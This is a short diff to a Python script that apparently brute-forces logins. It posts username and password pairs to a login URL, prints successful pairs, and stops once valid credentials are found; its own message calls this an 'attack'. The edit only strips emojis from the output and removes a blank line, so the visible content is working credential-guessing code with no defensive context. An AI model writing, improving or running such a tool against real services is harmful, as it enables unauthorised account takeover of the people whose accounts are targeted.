@@ -25,20 +25,19 @@ def attempt_login(username, password):
     try:
         response = session.post(LOGIN_URL, json=data, timeout=5)
         if response.status_code == 200:
-            print(f"✅ SUCCESS: {username}:{password}")
+            print(f"SUCCESS: {username}:{password}")
             return True
         else:
-            print(f"❌ FAILED: {username}:{password} (Status {response.status_code})")
+            print(f"FAILED: {username}:{password} (Status {response.status_code})")
             return False
     except requests.exceptions.RequestException as e:
-        print(f"⚠️ ERROR: {e}")
+        print(f"ERROR: {e}")
         return False
 
 def worker(credentials):
-
     for username, password in credentials:
         if attempt_login(username, password):
-            print("🚀 Stopping attack - valid credentials found!")
+            print("Stopping attack - valid credentials found!")
             return
 
 def main():
